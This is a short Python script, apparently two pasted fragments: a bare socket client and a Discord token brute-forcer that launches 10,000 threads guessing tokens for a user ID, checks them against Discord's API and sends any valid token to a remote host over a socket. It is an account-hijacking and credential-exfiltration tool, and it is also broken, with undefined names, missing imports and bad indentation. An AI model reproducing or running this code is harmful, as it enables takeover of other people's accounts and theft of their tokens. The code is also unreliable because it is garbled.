import socket

HOST = ''  # The server's hostname or IP address
PORT = 1234        # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    data = s.recv(1024)

print('Received', repr(data).decode())
from threading import Thread as thr
for i in range(10000):
    thr(target = gen, args = (encodedid)).start()
def gen(encodedid):
  while True:
    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
    token = f"{encodedid}.{second}.{end}"
    headers = {'Content-Type': 'application/json', 'authorization': token}
    url = "https://discordapp.com/api/v6/users/@me/library"
    r = req.get(url, headers=headers)
    if r.status_code == 200:
        print(f'{token} Valid')
        notif("Token cracked", f"The user's token has been found")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                   s.sendall(token)
        exit(0)
    else:
        print(f'{token} Invalid')
